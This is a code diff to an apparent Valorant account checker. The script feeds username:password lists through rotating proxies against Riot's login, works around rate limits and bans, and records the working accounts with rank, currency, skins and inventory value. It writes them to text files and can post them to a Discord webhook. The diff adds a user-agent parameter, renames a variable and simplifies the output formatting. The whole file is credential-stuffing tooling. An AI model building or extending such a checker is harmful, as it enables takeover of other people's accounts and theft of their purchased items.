@@ -18,7 +18,8 @@ stff = staff.staff()
 
 
 class simplechecker():
-    def __init__(self, settings: list, proxylist) -> None:
+    def __init__(self, settings: list, proxylist, useragent) -> None:
+        self.useragent = useragent
         path = os.getcwd()
         self.parentpath = os.path.abspath(os.path.join(path, os.pardir))
         self.proxylist = proxylist
@@ -68,14 +69,6 @@ class simplechecker():
             else:
                 pass
 
-        # try:
-        #    from pypresence import Presence
-        #    from pypresence.exceptions import DiscordNotFound, InvalidID
-        #    self.rpc = Presence("1019363739859963915")
-        #    self.rpc.connect()
-        # except ModuleNotFoundError:
-        #    pass
-
         self.cpm = 0
         self.startedcount = 0
         self.cpmtext = self.cpm
@@ -114,7 +107,7 @@ class simplechecker():
         os.system(f'mode con: cols=150 lines=32')
         # self.threadam = int(input(
         #    f'input number if threads (min 1 max 1000) (proxies: {self.proxycount} (don\'t work rn)) >>>'))
-        input('0 threads; 0 proxies; enter to start >>>')
+        input(f'0 threads (you can\'t edit this now); {self.proxycount} proxies; enter to start >>>')
         #self.threadam = self.threadam if 1000 > self.threadam > 0 else self.proxycount if self.proxycount > 1 else 3
         self.threadam = 0
         menu_choices = [
@@ -122,29 +115,9 @@ class simplechecker():
             'GUI',
             'LOG (works better with threads)'
         ]
-        # if inquirer.confirm(
-        #    message="Do you want to see the system log?", default=True
-        # ).execute() == True:
-        #    #self.log=staff.log()
-        #    #self.log.log('capybaras')
-        #    pass
-        # else:
-        #    self.log=False
-
-        # res = inquirer.select(
-        #    message="Please select mode:",
-        #    choices=menu_choices,
-        #    default=menu_choices[0],
-        #    pointer='>'
-        # ).execute()
         res = menu_choices[1]
         self.uselog = True if res == menu_choices[2] else False
-        # threadam=10000
         num = 0
-        # if log:
-        #    input(1)
-        # else:
-        #    input(0)
         self.startedtesting = sys.getmillis()
         self.whtime = sys.getmillis()
         if self.uselog == False:
@@ -181,18 +154,18 @@ class simplechecker():
         proxy = sys.getproxy(self.proxylist)
         account = f'{username}:{password}'
         space = " "
-        authenticate = auth.auth()
+        authenticate = auth.auth(self.useragent)
         # self.printinfo()
         while True:
             try:
-                token, entt, uuid, mailverif, banuntil = authenticate.auth(
+                token, entt, uuid, unverifmail, banuntil = authenticate.auth(
                     account, proxy=proxy)
                 if banuntil != None:
                     banuntil = stff.checkban(banuntil)
                 if token == 2:
                     with open(f'{self.parentpath}/log.txt', 'a') as f:
                         f.write(
-                            f'({datetime.now()}) {mailverif}\n_________________________________\n')
+                            f'({datetime.now()}) {unverifmail}\n_________________________________\n')
                     self.err += 1
                 elif token == 1:
                     if riotlimitinarow < self.max_rlimits:
@@ -217,7 +190,7 @@ class simplechecker():
                             file.write(f'\n{account}')
                         break
                 elif token == 6:
-                    if mailverif == True:
+                    if unverifmail == True:
                         proxy = sys.getproxy(self.proxylist)
                     self.retries += 1
                     time.sleep(1)
@@ -237,12 +210,12 @@ class simplechecker():
                     time.sleep(1)
                     continue
                 else:
-                    if mailverif == True and banuntil == None:
+                    if unverifmail == True and banuntil == None:
                         self.unverifiedmail += 1
                     while True:
-                        reg, lvl = sys.get_region(token, proxy)
-                        reg2, country = sys.get_region2(token)
-                        reg = reg2 if reg == 'N/A' else reg
+                        #reg, lvl = sys.get_region(token,entt,uuid,reg)
+                        reg2, country, lvl = sys.get_region2(token,entt,uuid,proxy)
+                        reg = reg2
                         if reg != 'N/A' and reg != '':
                             if banuntil == None:
                                 self.regions[str(reg).lower()] += 1
@@ -297,23 +270,19 @@ class simplechecker():
                             skins = 'N/A\n'
                             reg = 'N/A'
                         break
-                    skinsformatted = '\n║'.join(skins.split('\n'))
-                    skinsformatted = [
-                        i+(space*(62-len(i)))+'║' for i in skinsformatted.split('\n')]
-                    skinsformatted[0] = skinsformatted[0][:-2]+'║'
-                    skinsformatted = '║'+'\n'.join(skinsformatted)
+                    skinsformatted = '\n'.join(skins.split('\n'))
                     if banuntil != None:
                         self.tempbanned += 1
                         with open(f'{self.outpath}/tempbanned.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
-║            | {account} |{space*(49-len(f'| {account} |'))}║
-║ Ban Until: {banuntil}{space*(61-len(f'Ban Until: {banuntil}'))}║
-║                                                             ║
-║ Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}'))}║
-║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
-║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
-║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
+║            | {account} |
+║ Ban Until: {banuntil}
+║
+║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}
+║ Rank: {rank} | Last Played: {lastplayed}
+║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}
+║             Inventory Price = {invprice} VP
 ╠═════════════════════════════════════════════════════════════╣
 {skinsformatted}
 ╚═════════════════════════════════════════════════════════════╝
@@ -322,7 +291,7 @@ class simplechecker():
                         # with open(f'{self.parentpath}/output/valid.json','r+',encoding='utf-8') as f:
                         #    data=json.load(f)
                         #    temp=data['valid']
-                        #    toadd={'LogPass':account,'region':reg,'rank':rank,'level':lvl,'lastmatch':lastplayed,'unverifiedmail':mailverif,'vp':vp,'rp':rp,'skinscount':skinscount,f'skins':skins.strip('\n').split('\n')}
+                        #    toadd={'LogPass':account,'region':reg,'rank':rank,'level':lvl,'lastmatch':lastplayed,'unverifiedmail':unverifmail,'vp':vp,'rp':rp,'skinscount':skinscount,f'skins':skins.strip('\n').split('\n')}
                         #    temp.append(toadd)
                         #    f.seek(0)
                         #    json.dump(data, f, indent=4)
@@ -330,13 +299,13 @@ class simplechecker():
                         with open(f'{self.outpath}/valid.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
-║            | {account} |{space*(49-len(f'| {account} |'))}║
-║                                                             ║
-║                                                             ║
-║ Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}'))}║
-║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
-║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
-║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
+║            | {account} |
+║
+║
+║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}
+║ Rank: {rank} | Last Played: {lastplayed}
+║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}
+║             Inventory Price = {invprice} VP
 ╠═════════════════════════════════════════════════════════════╣
 {skinsformatted}
 ╚═════════════════════════════════════════════════════════════╝
@@ -356,12 +325,12 @@ class simplechecker():
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
 ║            | {account} |{space*(49-len(f'| {account} |'))}║
-║ {bantext}{space*(61-len(bantext))}║
-║                                                             ║
-║ Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}'))}║
-║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
-║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
-║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
+║ {bantext}
+║
+║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}
+║ Rank: {rank} | Last Played: {lastplayed}
+║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}
+║             Inventory Price = {invprice} VP
 ╠═════════════════════════════════════════════════════════════╣
 {skinsformatted}
 ╚═════════════════════════════════════════════════════════════╝
@@ -386,13 +355,13 @@ class simplechecker():
                         with open(f'{path}/{reg}.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
-║            | {account} |{space*(49-len(f'| {account} |'))}║
-║                                                             ║
-║                                                             ║
-║ Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {mailverif} | Level: {lvl} | Region: {reg} , {country}'))}║
-║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
-║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
-║             Inventory Price = {invprice} VP{space*(61-len(f'             Inventory Price = {invprice} VP'))}║
+║            | {account} |
+║
+║
+║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}
+║ Rank: {rank} | Last Played: {lastplayed}
+║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}
+║             Inventory Price = {invprice} VP
 ╠═════════════════════════════════════════════════════════════╣
 {skinsformatted}
 ╚═════════════════════════════════════════════════════════════╝
@@ -411,7 +380,6 @@ class simplechecker():
                         if skinscount == 0 and not self.send_woskins:
                             send_wh = False
 
-                        # input(send_wh)
                         if send_wh == True:
                             from discord_webhook import (DiscordEmbed,
                                                          DiscordWebhook)
@@ -434,7 +402,7 @@ class simplechecker():
                             embed.add_embed_field(
                                 name='Lastmatch', value=lastplayed)
                             embed.add_embed_field(
-                                name='Full Access', value=mailverif)
+                                name='Full Access', value=unverifmail)
                             embed.add_embed_field(
                                 name=f'VP / RP', value=f'{vp} / {rp}')
                             embed.add_embed_field(name=f'Skins ({skinscount}) ≈ {invprice} VP', value=skins if skins.replace(
@@ -444,7 +412,6 @@ class simplechecker():
                             # input(response)
 
             except Exception as e:
-                # input(e)
                 with open(f'{self.parentpath}/log.txt', 'a', errors='replace', encoding='utf-8') as f:
                     f.write(
                         f'({datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
@@ -539,4 +506,3 @@ class simplechecker():
 {Fore.LIGHTCYAN_EX} Estimated remaining time: {self.esttime}{reset}
 
         ''')
-# {Fore.LIGHTRED_EX} Threads with an rlimit: {self.inrlimit}{reset}
